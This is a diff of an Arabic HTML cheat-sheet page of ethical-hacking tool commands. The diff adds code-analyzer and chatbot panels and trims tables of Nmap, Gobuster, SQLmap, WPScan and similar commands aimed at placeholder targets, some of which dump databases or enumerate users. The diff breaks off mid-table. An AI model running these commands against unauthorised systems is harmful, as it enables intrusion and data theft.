@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الموسوعة البرمجية - أدوات الاختراق الأخلاقي والأمن السيبراني</title>
+    <title>الموسوعة البرمجية - أدوات الاختراق الأخلاقي والأمن السيبراني + محلل أكواد + مساعد ذكي</title>
     <style>
         * {
             margin: 0;
@@ -32,7 +32,6 @@
             line-height: 1.6;
         }
 
-        /* Scrollbar Styling */
         ::-webkit-scrollbar {
             width: 10px;
         }
@@ -301,7 +300,6 @@
             background: rgba(0, 0, 0, 0.2);
         }
 
-        /* Command Cell */
         .command-cell {
             background: rgba(10, 14, 39, 0.6);
             border-radius: 4px;
@@ -312,7 +310,6 @@
             position: relative;
         }
 
-        /* Copy Button */
         .copy-btn {
             background: rgba(0, 212, 255, 0.1);
             border: 1px solid var(--neon-blue);
@@ -339,7 +336,6 @@
             color: var(--neon-green);
         }
 
-        /* Tool Item */
         .tool-item {
             margin-bottom: 20px;
             padding: 15px;
@@ -375,7 +371,6 @@
             min-width: 200px;
         }
 
-        /* No Results */
         .no-results {
             text-align: center;
             padding: 40px;
@@ -383,7 +378,281 @@
             font-size: 16px;
         }
 
+        /* ========== CODE ANALYZER STYLES ========== */
+        .code-analyzer-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .code-input-box {
+            background: rgba(26, 31, 58, 0.6);
+            border: 2px solid var(--neon-blue);
+            border-radius: 8px;
+            padding: 20px;
+        }
+
+        .code-input-box h3 {
+            color: var(--neon-green);
+            margin-bottom: 15px;
+            font-size: 16px;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+        }
+
+        #codeInput {
+            width: 100%;
+            height: 300px;
+            background: rgba(10, 14, 39, 0.8);
+            border: 1px solid var(--neon-blue);
+            border-radius: 4px;
+            padding: 15px;
+            color: var(--neon-green);
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            resize: vertical;
+            margin-bottom: 15px;
+        }
+
+        #codeInput:focus {
+            outline: none;
+            border-color: var(--neon-green);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
+        }
+
+        #codeInput::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .analyze-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
+            border: none;
+            border-radius: 4px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+        }
+
+        .analyze-btn:hover {
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+            transform: translateY(-2px);
+        }
+
+        .analyze-btn:active {
+            transform: translateY(0);
+        }
+
+        .code-output-box {
+            background: rgba(26, 31, 58, 0.6);
+            border: 2px solid var(--neon-green);
+            border-radius: 8px;
+            padding: 20px;
+            max-height: 450px;
+            overflow-y: auto;
+        }
+
+        .code-output-box h3 {
+            color: var(--neon-pink);
+            margin-bottom: 15px;
+            font-size: 16px;
+            text-shadow: 0 0 10px rgba(255, 0, 110, 0.3);
+        }
+
+        .analysis-result {
+            background: rgba(10, 14, 39, 0.8);
+            border-left: 3px solid var(--neon-green);
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+        }
+
+        .analysis-result h4 {
+            color: var(--neon-blue);
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+
+        .analysis-result p {
+            color: var(--text-primary);
+            font-size: 12px;
+            line-height: 1.5;
+        }
+
+        .tool-badge {
+            display: inline-block;
+            background: rgba(176, 0, 255, 0.2);
+            border: 1px solid var(--neon-purple);
+            color: var(--neon-purple);
+            padding: 4px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            margin: 3px 3px 3px 0;
+        }
+
+        .clear-btn {
+            width: 100%;
+            padding: 8px;
+            background: rgba(255, 0, 110, 0.1);
+            border: 1px solid var(--neon-pink);
+            color: var(--neon-pink);
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .clear-btn:hover {
+            background: rgba(255, 0, 110, 0.2);
+        }
+
+        /* ========== CHATBOT STYLES ========== */
+        .chatbot-container {
+            background: rgba(26, 31, 58, 0.6);
+            border: 2px solid var(--neon-purple);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            max-height: 600px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chatbot-header {
+            color: var(--neon-purple);
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--neon-purple);
+            font-weight: bold;
+            font-size: 16px;
+            text-shadow: 0 0 10px rgba(176, 0, 255, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .bot-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            margin-bottom: 15px;
+            background: rgba(10, 14, 39, 0.8);
+            border-radius: 4px;
+            padding: 15px;
+            min-height: 300px;
+            max-height: 400px;
+        }
+
+        .chat-message {
+            margin-bottom: 12px;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .message-user {
+            text-align: right;
+        }
+
+        .message-user .message-content {
+            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
+            color: #fff;
+            display: inline-block;
+            padding: 10px 15px;
+            border-radius: 12px 4px 12px 12px;
+            max-width: 80%;
+            font-size: 12px;
+        }
+
+        .message-bot {
+            text-align: left;
+        }
+
+        .message-bot .message-content {
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            display: inline-block;
+            padding: 10px 15px;
+            border-radius: 4px 12px 12px 4px;
+            max-width: 80%;
+            font-size: 12px;
+            word-wrap: break-word;
+        }
+
+        .chat-input-area {
+            display: flex;
+            gap: 10px;
+        }
+
+        #chatInput {
+            flex: 1;
+            padding: 12px;
+            background: rgba(10, 14, 39, 0.8);
+            border: 1px solid var(--neon-purple);
+            border-radius: 4px;
+            color: var(--neon-green);
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+        }
+
+        #chatInput:focus {
+            outline: none;
+            border-color: var(--neon-green);
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+        }
+
+        .chat-send-btn {
+            padding: 12px 20px;
+            background: linear-gradient(90deg, var(--neon-purple), var(--neon-pink));
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+        }
+
+        .chat-send-btn:hover {
+            box-shadow: 0 0 15px rgba(176, 0, 255, 0.5);
+            transform: translateY(-2px);
+        }
+
         /* Responsive */
+        @media (max-width: 1024px) {
+            .code-analyzer-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
         @media (max-width: 768px) {
             .sidebar {
                 width: 100%;
@@ -423,6 +692,15 @@
             .copy-btn {
                 width: 100%;
             }
+
+            #codeInput {
+                height: 200px;
+            }
+
+            .message-user .message-content,
+            .message-bot .message-content {
+                max-width: 95%;
+            }
         }
 
         /* Animation */
@@ -435,7 +713,6 @@
             animation: glow 2s infinite;
         }
 
-        /* Loading State */
         .loading {
             display: inline-block;
             width: 8px;
@@ -446,12 +723,6 @@
             margin-left: 5px;
         }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        /* Badge */
         .badge {
             display: inline-block;
             background: rgba(176, 0, 255, 0.2);
@@ -487,13 +758,11 @@
         <div class="nav-section">
             <div class="nav-section-title">🔍 استكشاف الشبكات</div>
             <div class="nav-item active" onclick="scrollToSection('info-gathering')">جمع المعلومات</div>
-            <div class="nav-item" onclick="scrollToSection('network-scan')">فحص الشبكات</div>
         </div>
 
         <div class="nav-section">
             <div class="nav-section-title">🌐 اختبار المواقع</div>
             <div class="nav-item" onclick="scrollToSection('web-penetration')">اختراق المواقع</div>
-            <div class="nav-item" onclick="scrollToSection('wordpress')">فحص الووردبريس</div>
         </div>
 
         <div class="nav-section">
@@ -506,6 +775,12 @@
             <div class="nav-item" onclick="scrollToSection('exploitation')">استغلال الثغرات</div>
             <div class="nav-item" onclick="scrollToSection('password-cracking')">كسر كلمات المرور</div>
         </div>
+
+        <div class="nav-section">
+            <div class="nav-section-title">🤖 أدوات ذكية</div>
+            <div class="nav-item" onclick="scrollToSection('code-analyzer')">محلل الأكواد</div>
+            <div class="nav-item" onclick="scrollToSection('chatbot')">مساعد ذكي</div>
+        </div>
     </aside>
 
     <!-- Main Content -->
@@ -513,7 +788,7 @@
         <!-- Header -->
         <div class="header">
             <h1>⚔️ الموسوعة البرمجية الكاملة</h1>
-            <p>🔐 أدوات الاختراق الأخلاقي والأمن السيبراني | Ethical Hacking & Cybersecurity Tools</p>
+            <p>🔐 أدوات الاختراق الأخلاقي والأمن السيبراني + محلل أكواد + مساعد ذكي | Ethical Hacking & Cybersecurity Tools</p>
         </div>
 
         <!-- Search Bar -->
@@ -531,7 +806,72 @@
             ❌ لم يتم العثور على نتائج | No results found
         </div>
 
-        <!-- ==================== قسم 1: جمع المعلومات وفحص الشبكات ==================== -->
+        <!-- ==================== محلل الأكواد الذكي ==================== -->
+        <div class="section" data-section="code-analyzer">
+            <div class="section-header" onclick="toggleSection(this)">
+                <div class="section-title">
+                    <span class="section-icon">🔍</span>
+                    محلل ومفسر الأكواد الذكي | Code Analyzer
+                </div>
+                <button class="toggle-btn">+</button>
+            </div>
+            <div class="section-content active">
+                <div class="code-analyzer-container">
+                    <div class="code-input-box">
+                        <h3>📝 أدخل الكود هنا</h3>
+                        <textarea 
+                            id="codeInput" 
+                            placeholder="الصق كود Python أو Bash أو JavaScript أو أي لغة برمجية...&#10;Paste your code here (Python, Bash, JavaScript, etc.)..."
+                        ></textarea>
+                        <button class="analyze-btn" onclick="analyzeCode()">🔬 حلل الكود | Analyze Code</button>
+                        <button class="clear-btn" onclick="clearCodeAnalyzer()">🗑️ مسح</button>
+                    </div>
+                    <div class="code-output-box">
+                        <h3>📊 نتائج التحليل</h3>
+                        <div id="analysisOutput">
+                            <p style="color: var(--text-secondary); text-align: center;">أدخل كود ثم اضغط "حلل الكود"<br>Enter code and click analyze</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== مساعد الأمن السيبراني الذكي ==================== -->
+        <div class="section" data-section="chatbot">
+            <div class="section-header" onclick="toggleSection(this)">
+                <div class="section-title">
+                    <span class="section-icon">🤖</span>
+                    مساعد الأمن السيبراني الذكي | Cyber AI Assistant
+                </div>
+                <button class="toggle-btn">+</button>
+            </div>
+            <div class="section-content">
+                <div class="chatbot-container">
+                    <div class="chatbot-header">
+                        <span class="bot-status"></span>
+                        🤖 CyberBot Assistant - متصل | Connected
+                    </div>
+                    <div class="chat-messages" id="chatMessages">
+                        <div class="chat-message message-bot">
+                            <div class="message-content">
+                                👋 مرحباً! أنا مساعد الأمن السيبراني الذكي. اسأل عن أي أداة اختراق أخلاقي أو تقنية أمنية وسأساعدك بأفضل الطرق والأوامر. Hello! I'm your Cyber Security AI Assistant.
+                            </div>
+                        </div>
+                    </div>
+                    <div class="chat-input-area">
+                        <input 
+                            type="text" 
+                            id="chatInput" 
+                            placeholder="اسأل عن أداة أو تقنية... (Ask about tools...)"
+                            onkeypress="if(event.key==='Enter') sendChatMessage()"
+                        >
+                        <button class="chat-send-btn" onclick="sendChatMessage()">💬 إرسال</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== قسم 1: جمع المعلومات ==================== -->
         <div class="section" data-section="info-gathering">
             <div class="section-header" onclick="toggleSection(this)">
                 <div class="section-title">
@@ -541,171 +881,56 @@
                 <button class="toggle-btn">+</button>
             </div>
             <div class="section-content">
-                <!-- Nmap Tools -->
                 <div class="tool-item" data-tool="nmap">
-                    <div class="tool-name">🎯 Nmap - فحص الشبكات والمنافذ المفتوحة</div>
+                    <div class="tool-name">🎯 Nmap - فحص الشبكات</div>
                     <table>
                         <thead>
                             <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
+                                <th>الأمر</th>
+                                <th>الوظيفة</th>
+                                <th>إجراء</th>
                             </tr>
                         </thead>
                         <tbody>
                             <tr data-search="nmap basic scan port">
-                                <td>فحص بسيط | Basic Scan</td>
                                 <td><span class="command-cell">nmap 192.168.1.1</span></td>
-                                <td>فحص جميع المنافذ الشهيرة على الهدف</td>
+                                <td>فحص جميع المنافذ</td>
                                 <td><button class="copy-btn" onclick="copyCommand('nmap 192.168.1.1')">نسخ</button></td>
                             </tr>
-                            <tr data-search="nmap specific port">
-                                <td>فحص منفذ محدد | Specific Port</td>
-                                <td><span class="command-cell">nmap -p 80,443 192.168.1.1</span></td>
-                                <td>فحص المنافذ 80 و 443 فقط</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nmap -p 80,443 192.168.1.1')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="nmap os detection operating system">
-                                <td>كشف نظام التشغيل | OS Detection</td>
+                            <tr data-search="nmap os detection">
                                 <td><span class="command-cell">nmap -O 192.168.1.1</span></td>
-                                <td>محاولة تحديد نظام التشغيل</td>
+                                <td>كشف نظام التشغيل</td>
                                 <td><button class="copy-btn" onclick="copyCommand('nmap -O 192.168.1.1')">نسخ</button></td>
                             </tr>
-                            <tr data-search="nmap script scanning vuln vulnerability">
-                                <td>فحص الثغرات | Vulnerability Scan</td>
+                            <tr data-search="nmap script vuln">
                                 <td><span class="command-cell">nmap --script vuln 192.168.1.1</span></td>
-                                <td>البحث عن الثغرات الأمنية المعروفة</td>
+                                <td>فحص الثغرات</td>
                                 <td><button class="copy-btn" onclick="copyCommand('nmap --script vuln 192.168.1.1')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="nmap aggressive scan fast">
-                                <td>فحص عدواني سريع | Aggressive Scan</td>
-                                <td><span class="command-cell">nmap -A -T4 192.168.1.1</span></td>
-                                <td>فحص شامل وسريع مع كشف الخدمات</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nmap -A -T4 192.168.1.1')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="nmap ping sweep network discover">
-                                <td>اكتشاف الأجهزة | Ping Sweep</td>
-                                <td><span class="command-cell">nmap -sn 192.168.1.0/24</span></td>
-                                <td>اكتشاف جميع الأجهزة المتصلة بالشبكة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nmap -sn 192.168.1.0/24')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="nmap syn stealth scan">
-                                <td>فحص خفي | Stealth Scan</td>
-                                <td><span class="command-cell">nmap -sS 192.168.1.1</span></td>
-                                <td>فحص SYN خفي لا يكمل الاتصال</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nmap -sS 192.168.1.1')">نسخ</button></td>
                             </tr>
                         </tbody>
                     </table>
                 </div>
 
-                <!-- Gobuster Tools -->
                 <div class="tool-item" data-tool="gobuster">
-                    <div class="tool-name">🚀 Gobuster - تخمين المسارات والملفات المخفية</div>
+                    <div class="tool-name">🚀 Gobuster - تخمين المسارات</div>
                     <table>
                         <thead>
                             <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
+                                <th>الأمر</th>
+                                <th>الوظيفة</th>
+                                <th>إجراء</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <tr data-search="gobuster dir directory enumeration">
-                                <td>تعداد المجلدات | Directory Enum</td>
+                            <tr data-search="gobuster dir directory">
                                 <td><span class="command-cell">gobuster dir -u http://target.com -w wordlist.txt</span></td>
-                                <td>البحث عن المجلدات والملفات المخفية</td>
+                                <td>البحث عن مجلدات</td>
                                 <td><button class="copy-btn" onclick="copyCommand('gobuster dir -u http://target.com -w wordlist.txt')">نسخ</button></td>
                             </tr>
                             <tr data-search="gobuster dns subdomain">
-                                <td>البحث عن النطاقات الفرعية | DNS Enum</td>
                                 <td><span class="command-cell">gobuster dns -d target.com -w wordlist.txt</span></td>
-                                <td>اكتشاف النطاقات الفرعية</td>
+                                <td>البحث عن نطاقات فرعية</td>
                                 <td><button class="copy-btn" onclick="copyCommand('gobuster dns -d target.com -w wordlist.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="gobuster status code filter">
-                                <td>تصفية النتائج | Status Filter</td>
-                                <td><span class="command-cell">gobuster dir -u http://target.com -w wordlist.txt -s 200,301</span></td>
-                                <td>إظهار فقط الاستجابات 200 و 301</td>
-                                <td><button class="copy-btn" onclick="copyCommand('gobuster dir -u http://target.com -w wordlist.txt -s 200,301')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="gobuster extensions php asp html">
-                                <td>البحث عن الملفات | Extensions</td>
-                                <td><span class="command-cell">gobuster dir -u http://target.com -w wordlist.txt -x php,html,asp</span></td>
-                                <td>البحث عن ملفات بصيغ محددة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('gobuster dir -u http://target.com -w wordlist.txt -x php,html,asp')">نسخ</button></td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-
-                <!-- Subfinder Tools -->
-                <div class="tool-item" data-tool="subfinder">
-                    <div class="tool-name">🔗 Subfinder - البحث عن النطاقات الفرعية</div>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr data-search="subfinder basic domain">
-                                <td>بحث أساسي | Basic Search</td>
-                                <td><span class="command-cell">subfinder -d target.com</span></td>
-                                <td>العثور على النطاقات الفرعية الأساسية</td>
-                                <td><button class="copy-btn" onclick="copyCommand('subfinder -d target.com')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="subfinder output file">
-                                <td>حفظ النتائج | Save Results</td>
-                                <td><span class="command-cell">subfinder -d target.com -o results.txt</span></td>
-                                <td>حفظ النطاقات الفرعية في ملف</td>
-                                <td><button class="copy-btn" onclick="copyCommand('subfinder -d target.com -o results.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="subfinder all sources">
-                                <td>جميع المصادر | All Sources</td>
-                                <td><span class="command-cell">subfinder -d target.com -all</span></td>
-                                <td>البحث من جميع المصادر المتاحة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('subfinder -d target.com -all')">نسخ</button></td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-
-                <!-- Amass Tools -->
-                <div class="tool-item" data-tool="amass">
-                    <div class="tool-name">🌐 Amass - تعداد وجمع المعلومات الشامل</div>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr data-search="amass enum domain enumeration">
-                                <td>تعداد المجالات | Domain Enum</td>
-                                <td><span class="command-cell">amass enum -d target.com</span></td>
-                                <td>تعداد شامل للنطاقات الفرعية</td>
-                                <td><button class="copy-btn" onclick="copyCommand('amass enum -d target.com')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="amass intel gather information">
-                                <td>جمع المعلومات | Intelligence</td>
-                                <td><span class="command-cell">amass intel -whois -d target.com</span></td>
-                                <td>جمع معلومات WHOIS</td>
-                                <td><button class="copy-btn" onclick="copyCommand('amass intel -whois -d target.com')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="amass graph database">
-                                <td>حفظ في قاعدة بيانات | Database</td>
-                                <td><span class="command-cell">amass enum -d target.com -dir ./amass-results</span></td>
-                                <td>حفظ النتائج في قاعدة بيانات محلية</td>
-                                <td><button class="copy-btn" onclick="copyCommand('amass enum -d target.com -dir ./amass-results')">نسخ</button></td>
                             </tr>
                         </tbody>
                     </table>
@@ -713,164 +938,36 @@
             </div>
         </div>
 
-        <!-- ==================== قسم 2: اختبار اختراق المواقع ==================== -->
+        <!-- ==================== قسم 2: اختبار المواقع ==================== -->
         <div class="section" data-section="web-penetration">
             <div class="section-header" onclick="toggleSection(this)">
                 <div class="section-title">
                     <span class="section-icon">🌐</span>
-                    اختبار اختراق المواقع والخدمات
+                    اختبار اختراق المواقع
                 </div>
                 <button class="toggle-btn">+</button>
             </div>
             <div class="section-content">
-                <!-- Nikto Tools -->
-                <div class="tool-item" data-tool="nikto">
-                    <div class="tool-name">🔎 Nikto - فحص الخوادم والمواقع</div>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr data-search="nikto host web server">
-                                <td>فحص أساسي | Basic Scan</td>
-                                <td><span class="command-cell">nikto -h http://target.com</span></td>
-                                <td>فحص شامل للخادم للثغرات الشهيرة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nikto -h http://target.com')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="nikto port specific">
-                                <td>فحص منفذ محدد | Specific Port</td>
-                                <td><span class="command-cell">nikto -h target.com -p 8080</span></td>
-                                <td>فحص خادم على منفذ محدد</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nikto -h target.com -p 8080')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="nikto ssl https">
-                                <td>فحص HTTPS | SSL Scan</td>
-                                <td><span class="command-cell">nikto -h https://target.com -ssl</span></td>
-                                <td>فحص الخادم الآمن (HTTPS)</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nikto -h https://target.com -ssl')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="nikto output file report">
-                                <td>حفظ التقرير | Save Report</td>
-                                <td><span class="command-cell">nikto -h http://target.com -o report.txt</span></td>
-                                <td>حفظ نتائج الفحص في ملف</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nikto -h http://target.com -o report.txt')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="nikto multiple hosts">
-                                <td>فحص متعدد | Multiple Hosts</td>
-                                <td><span class="command-cell">nikto -h target1.com,target2.com,target3.com</span></td>
-                                <td>فحص عدة مواقع في نفس الوقت</td>
-                                <td><button class="copy-btn" onclick="copyCommand('nikto -h target1.com,target2.com,target3.com')">نسخ</button></td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-
-                <!-- SQLmap Tools -->
                 <div class="tool-item" data-tool="sqlmap">
-                    <div class="tool-name">💉 SQLmap - اختبار حقن قاعدة البيانات</div>
+                    <div class="tool-name">💉 SQLmap - حقن قاعدة البيانات</div>
                     <table>
                         <thead>
                             <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
+                                <th>الأمر</th>
+                                <th>الوظيفة</th>
+                                <th>إجراء</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <tr data-search="sqlmap basic url parameter">
-                                <td>فحص أساسي | Basic Test</td>
+                            <tr data-search="sqlmap basic url">
                                 <td><span class="command-cell">sqlmap -u "http://target.com/page.php?id=1"</span></td>
-                                <td>فحص الثغرة في معامل GET</td>
+                                <td>فحص الثغرة</td>
                                 <td><button class="copy-btn" onclick="copyCommand('sqlmap -u \"http://target.com/page.php?id=1\"')">نسخ</button></td>
                             </tr>
-                            <tr data-search="sqlmap post method data">
-                                <td>فحص POST | POST Method</td>
-                                <td><span class="command-cell">sqlmap -u "http://target.com/login" --data "user=admin&pass=1"</span></td>
-                                <td>فحص ثغرة الحقن في طلب POST</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sqlmap -u \"http://target.com/login\" --data \"user=admin&pass=1\"')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="sqlmap database dump extract">
-                                <td>استخراج قاعدة البيانات | Dump DB</td>
+                            <tr data-search="sqlmap dump">
                                 <td><span class="command-cell">sqlmap -u "http://target.com/page.php?id=1" --dump</span></td>
-                                <td>استخراج كل البيانات من قاعدة البيانات</td>
+                                <td>استخراج البيانات</td>
                                 <td><button class="copy-btn" onclick="copyCommand('sqlmap -u \"http://target.com/page.php?id=1\" --dump')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="sqlmap tables list">
-                                <td>قائمة الجداول | List Tables</td>
-                                <td><span class="command-cell">sqlmap -u "http://target.com/page.php?id=1" --tables</span></td>
-                                <td>عرض جميع جداول قاعدة البيانات</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sqlmap -u \"http://target.com/page.php?id=1\" --tables')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="sqlmap database users">
-                                <td>كشف المستخدمين | Users Info</td>
-                                <td><span class="command-cell">sqlmap -u "http://target.com/page.php?id=1" --users</span></td>
-                                <td>عرض مستخدمي قاعدة البيانات</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sqlmap -u \"http://target.com/page.php?id=1\" --users')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="sqlmap batch auto">
-                                <td>الوضع التلقائي | Batch Mode</td>
-                                <td><span class="command-cell">sqlmap -u "http://target.com/page.php?id=1" --batch</span></td>
-                                <td>فحص تلقائي دون تفاعل المستخدم</td>
-                                <td><button class="copy-btn" onclick="copyCommand('sqlmap -u \"http://target.com/page.php?id=1\" --batch')">نسخ</button></td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-
-                <!-- WPScan Tools -->
-                <div class="tool-item" data-tool="wpscan">
-                    <div class="tool-name">🔐 WPScan - فحص مواقع الووردبريس</div>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr data-search="wpscan basic wordpress">
-                                <td>فحص أساسي | Basic Scan</td>
-                                <td><span class="command-cell">wpscan --url http://target.com</span></td>
-                                <td>فحص شامل لموقع الووردبريس</td>
-                                <td><button class="copy-btn" onclick="copyCommand('wpscan --url http://target.com')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="wpscan plugins enumerate">
-                                <td>تحديد الإضافات | Enumerate Plugins</td>
-                                <td><span class="command-cell">wpscan --url http://target.com --enumerate p</span></td>
-                                <td>اكتشاف جميع الإضافات المثبتة</td>
-                                <td><button class="copy-btn" onclick="copyCommand('wpscan --url http://target.com --enumerate p')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="wpscan users enumerate">
-                                <td>تحديد المستخدمين | Enumerate Users</td>
-                                <td><span class="command-cell">wpscan --url http://target.com --enumerate u</span></td>
-                                <td>اكتشاف أسماء مستخدمي الووردبريس</td>
-                                <td><button class="copy-btn" onclick="copyCommand('wpscan --url http://target.com --enumerate u')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="wpscan themes enumerate">
-                                <td>تحديد القوالب | Enumerate Themes</td>
-                                <td><span class="command-cell">wpscan --url http://target.com --enumerate t</span></td>
-                                <td>اكتشاف قوالب الووردبريس</td>
-                                <td><button class="copy-btn" onclick="copyCommand('wpscan --url http://target.com --enumerate t')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="wpscan version detection wp">
-                                <td>كشف الإصدار | Version Detection</td>
-                                <td><span class="command-cell">wpscan --url http://target.com --detection-mode aggressive</span></td>
-                                <td>كشف إصدار الووردبريس والمكونات</td>
-                                <td><button class="copy-btn" onclick="copyCommand('wpscan --url http://target.com --detection-mode aggressive')">نسخ</button></td>
-                            </tr>
-                            <tr data-search="wpscan api token">
-                                <td>مع API Token | With API Token</td>
-                                <td><span class="command-cell">wpscan --url http://target.com --api-token YOUR_TOKEN</span></td>
-                                <td>فحص متقدم مع الحصول على معلومات الثغرات</td>
-                                <td><button class="copy-btn" onclick="copyCommand('wpscan --url http://target.com --api-token YOUR_TOKEN')">نسخ</button></td>
                             </tr>
                         </tbody>
                     </table>
@@ -878,70 +975,36 @@
             </div>
         </div>
 
-        <!-- ==================== قسم 3: اختبار الشبكات اللاسلكية ==================== -->
+        <!-- ==================== قسم 3: الشبكات اللاسلكية ==================== -->
         <div class="section" data-section="wireless">
             <div class="section-header" onclick="toggleSection(this)">
                 <div class="section-title">
                     <span class="section-icon">📡</span>
-                    اختبار اختراق الشبكات اللاسلكية
+                    اختبار الشبكات اللاسلكية
                 </div>
                 <button class="toggle-btn">+</button>
             </div>
             <div class="section-content">
-                <!-- Aircrack-ng Tools -->
                 <div class="tool-item" data-tool="aircrack">
-                    <div class="tool-name">🔓 Aircrack-ng Suite - اختبار الشبكات اللاسلكية</div>
+                    <div class="tool-name">🔓 Aircrack-ng</div>
                     <table>
                         <thead>
                             <tr>
-                                <th>اسم الأمر | Command Name</th>
-                                <th>الأمر البرمجي | Command</th>
-                                <th>الوظيفة | Function</th>
-                                <th>إجراء | Action</th>
+                                <th>الأمر</th>
+                                <th>الوظيفة</th>
+                                <th>إجراء</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <tr data-search="airmon-ng check interface monitor">
